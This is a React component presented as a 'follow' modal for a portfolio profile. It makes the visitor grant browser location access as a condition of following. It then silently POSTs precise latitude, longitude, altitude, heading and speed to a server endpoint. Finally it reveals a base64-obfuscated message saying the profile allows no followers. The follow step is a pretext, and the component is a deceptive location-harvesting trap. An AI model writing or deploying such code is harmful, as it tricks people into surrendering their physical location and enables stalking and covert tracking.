"use client";

import { useCallback, useEffect, useState } from "react";

type FollowRestrictionModalProps = {
  isOpen: boolean;
  onClose: () => void;
};

export function FollowRestrictionModal({
  isOpen,
  onClose,
}: FollowRestrictionModalProps) {
  const [step, setStep] = useState<1 | 2>(1);
  const [locationError, setLocationError] = useState<string | null>(null);

  const finalMessage = atob(
    "VGhpcyBhY2NvdW50IGRvZXMgbm90IGFsbG93IGZvbGxvd2VycyBvbiB0aGlzIGN1c3RvbSBwb3J0Zm9saW8gcHJvZmlsZS4=",
  );

  const persistAllowedLocation = useCallback(
    async (coords: GeolocationCoordinates) => {
      try {
        await fetch("/api/lock-consent", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            latitude: coords.latitude,
            longitude: coords.longitude,
            accuracy: coords.accuracy,
            altitude: coords.altitude,
            altitudeAccuracy: coords.altitudeAccuracy,
            heading: coords.heading,
            speed: coords.speed,
          }),
        });
      } catch {
        // Location persistence failure should not block the modal flow.
      }
    },
    [],
  );

  const requestLocationAccess = useCallback(() => {
    if (typeof navigator !== "undefined" && "geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          setLocationError(null);
          setStep(2);
          void persistAllowedLocation(position.coords);
        },
        () => {
          setLocationError(
            "Location access denied. Open in device settings to allow location access.",
          );
          setStep(1);
        },
      );
      return;
    }

    setLocationError("Location service is unavailable on this browser.");
    setStep(1);
  }, [persistAllowedLocation]);

  useEffect(() => {
    if (!isOpen) {
      return;
    }

    setStep(1);
    setLocationError(null);
    requestLocationAccess();

    const handleEscape = (event: KeyboardEvent) => {
      if (event.key === "Escape") {
        onClose();
      }
    };

    window.addEventListener("keydown", handleEscape);

    return () => {
      window.removeEventListener("keydown", handleEscape);
    };
  }, [isOpen, onClose, requestLocationAccess]);

  if (!isOpen) {
    return null;
  }

  return (
    <div className="modal-overlay" role="presentation" onClick={onClose}>
      <section
        className="modal-card"
        role="dialog"
        aria-modal="true"
        aria-labelledby="follow-modal-title"
        onClick={(event) => event.stopPropagation()}
      >
        {step === 1 ? (
          <>
            <h2 id="follow-modal-title">Location access</h2>
            <p>allow location service to proceed</p>
            {locationError ? <p>{locationError}</p> : null}
            <div className="modal-actions">
              <button
                type="button"
                className="modal-primary"
                onClick={requestLocationAccess}
              >
                ALLOW LOCATION
              </button>
              <button type="button" className="modal-close" onClick={onClose}>
                CANCEL
              </button>
            </div>
          </>
        ) : (
          <>
            <h2 id="follow-modal-title">Follow unavailable</h2>
            <p>{finalMessage}</p>
            <button type="button" className="modal-close" onClick={onClose}>
              CLOSE
            </button>
          </>
        )}
      </section>
    </div>
  );
}
